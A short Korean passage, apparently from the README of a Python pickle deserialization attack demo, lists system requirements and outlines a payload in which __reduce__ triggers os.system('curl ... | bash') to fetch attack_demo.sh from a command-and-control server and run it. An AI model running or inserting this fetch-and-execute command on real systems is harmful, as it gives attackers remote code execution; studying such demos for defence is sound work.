...
### 시스템 요구사항
- Linux 또는 Windows,macOS (WSL2 지원)
- Python 3.8 이상
- 최소 2GB RAM
- 최소 500MB 디스크 공간
...
- 여기서는 `os.system('curl ... | bash')` 실행

**페이로드 동작**:
1. `curl`로 CnC 서버에서 스크립트 다운로드
2. `bash`로 스크립트 실행
3. 원격 코드 실행(RCE) 달성
...
5. `__reduce__()` 자동 호출
6. `os.system('curl ... | bash')` 실행
7. CnC 서버에서 `attack_demo.sh` 다운로드 및 실행
8. 공격 성공 메시지 표시
